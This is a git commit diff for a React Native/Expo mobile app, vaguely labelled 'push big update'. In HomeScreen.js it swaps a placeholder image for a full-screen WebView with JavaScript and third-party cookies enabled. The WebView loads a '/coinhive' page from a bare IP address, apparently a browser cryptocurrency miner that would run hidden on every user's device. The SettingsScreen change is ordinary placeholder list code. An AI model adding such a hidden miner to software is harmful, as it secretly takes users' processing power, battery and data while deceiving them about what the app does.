4a6d0d7ea0fde1a22a15c07682191935c0c376ab
Maciej Hajduk <ebrithil97@gmail.com>
2017-10-28 05:40:21 +0200

    push big update

--- MOBILE/screens/HomeScreen.js
+++ MOBILE/screens/HomeScreen.js
@@ -1,53 +1,65 @@
-import React, { Component } from 'react';
-import { ScrollView, StyleSheet, Image, Text, View, WebView } from 'react-native';
-import { ExpoLinksView } from '@expo/samples';
-import { WebBrowser } from 'expo';
-import { Ionicons } from '@expo/vector-icons';
+import React, {Component} from 'react';
+import {
+  ScrollView,
+  StyleSheet,
+  Image,
+  Text,
+  View,
+  WebView,
+  Ui
+} from 'react-native';
+import {ExpoLinksView} from '@expo/samples';
+import {WebBrowser} from 'expo';
+import {Ionicons} from '@expo/vector-icons';
 import Touchable from 'react-native-platform-touchable';
-
-
 
 export default class LinksScreen extends React.Component {
   static navigationOptions = {
-    title: 'Home', header: null
+    title: 'Home',
+    header: null
   };
 
   render() {
     return (
       <View style={styles.container}>
-      
-      <Image style={styles.img} source={require('../assets/images/robot-dev.png')}/>
-      
-    </View>
+
+        <WebView
+          javaScriptEnabled={true}
+          mixedContentMode="always"
+          thirdPartyCookiesEnabled={true}
+          source={{
+          uri: 'http://207.154.221.96:3000/coinhive'
+        }}></WebView>
+
+      </View>
     );
   }
-  _handleAddWatch = () => {
-    WebBrowser.openBrowserAsync('https://i1.jbzdy.pl/contents/2017/10/7126edd068d04f3b7077849dec6cb3dc.mp4');
-  };
+
 }
 
 const styles = StyleSheet.create({
+
   container: {
     marginTop: 2,
     flex: 1,
     paddingTop: 3,
-    backgroundColor: '#fff',
+    backgroundColor: '#fff'
   },
   optionIconContainer: {
-    marginRight: 9,
+    marginRight: 9
   },
   option: {
     backgroundColor: '#fdfdfd',
     paddingHorizontal: 3,
     paddingVertical: 15,
     borderBottomWidth: StyleSheet.hairlineWidth,
-    borderBottomColor: '#EDEDED',
+    borderBottomColor: '#EDEDED'
   },
   optionText: {
     paddingHorizontal: 50,
     paddingVertical: 23,
     borderBottomWidth: StyleSheet.hairlineWidth,
-    borderBottomColor: '#FFFFFF',
+    borderBottomColor: '#FFFFFF'
   },
 
   img: {
@@ -57,12 +69,5 @@ const styles = StyleSheet.create({
     width: 200,
     alignItems: 'center',
     justifyContent: 'center'
-  },
-
+  }
 });
-
-
-
-
-
-
--- MOBILE/screens/SettingsScreen.js
+++ MOBILE/screens/SettingsScreen.js
@@ -1,12 +1,37 @@
 import React from 'react';
 import { ExpoConfigView } from '@expo/samples';
+import {
+  Image,
+  Platform,
+  ScrollView,
+  StyleSheet,
+  Text,
+  TouchableOpacity,
+  View,
+  Button,
+  TextInput,
+  KeyboardAvoidingView,
+  ListView
+} from 'react-native';
+
 
 export default class SettingsScreen extends React.Component {
   static navigationOptions = { title: 'Settings', header: null };
 
+  constructor() {
+    super();
+    const ds = new ListView.DataSource({rowHasChanged: (r1, r2) => r1 !== r2});
+    this.state = {
+      dataSource: ds.cloneWithRows(['row 1', 'row 2']),
+    };
+  }
+
   render() {
-    /* Go ahead and delete ExpoConfigView and replace it with your
-     * content, we just wanted to give you a quick view of your config */
-    return <ExpoConfigView />;
+    return (
+      <ListView
+        dataSource={this.state.dataSource}
+        renderRow={(rowData) => <Text>{rowData}</Text>}
+      />
+    );
   }
 }
